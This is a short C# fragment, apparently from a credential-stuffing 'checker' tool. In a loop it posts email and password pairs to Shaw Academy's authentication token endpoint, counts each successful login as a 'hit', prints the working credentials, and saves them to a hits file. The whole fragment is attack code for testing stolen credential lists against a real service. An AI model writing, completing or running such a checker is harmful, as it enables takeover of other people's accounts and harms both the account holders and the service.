        ...
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              ...
              if (httpRequest.Post("https://api.shawacademy.com/v2/auth/token", str, "application/json;charset=UTF-8").ToString().Contains("{\"token\":\""))
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - SHAWACADEMY] " + s[0] + ":" + s[1], Color.Green);
                Export.AsResult("/Shawacademy_hits", s[0] + ":" + s[1]);
                return false;
              }
              break;
            }
